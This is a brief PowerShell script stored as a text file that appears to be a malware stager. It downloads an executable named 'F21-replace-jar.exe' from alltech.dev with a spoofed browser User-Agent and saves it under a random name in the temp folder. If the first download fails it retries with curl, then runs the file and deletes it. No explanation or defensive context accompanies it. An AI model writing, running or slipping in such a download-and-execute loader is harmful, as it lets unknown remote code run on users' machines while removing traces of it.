# f21.txt - alltech.dev only
$ErrorActionPreference = 'Stop'
$ua   = @{ 'User-Agent' = 'Mozilla/5.0' }
$fn   = "f21_$([guid]::NewGuid().ToString('N')).exe"
$dst  = Join-Path $env:TEMP $fn
$url  = 'https://alltech.dev/F21-replace-jar.exe'

# Pre-delete if exists
if (Test-Path $dst) { Remove-Item $dst -Force -ErrorAction SilentlyContinue }

# Try PowerShell download first
try {
    Invoke-WebRequest -Uri $url -Headers $ua -OutFile $dst -UseBasicParsing -TimeoutSec 90
} catch {
    # Fall back to curl
    try {
        $curl = (Get-Command curl.exe -ErrorAction SilentlyContinue).Source
        if ($curl) { & $curl -L -f -o "$dst" "$url" -H "User-Agent: Mozilla/5.0" }
    } catch { }
}

# Check success
if (-not (Test-Path $dst) -or ((Get-Item $dst).Length -lt 1024)) {
    throw "Download failed from $url"
}

Start-Process $dst -Wait
Remove-Item $dst -Force
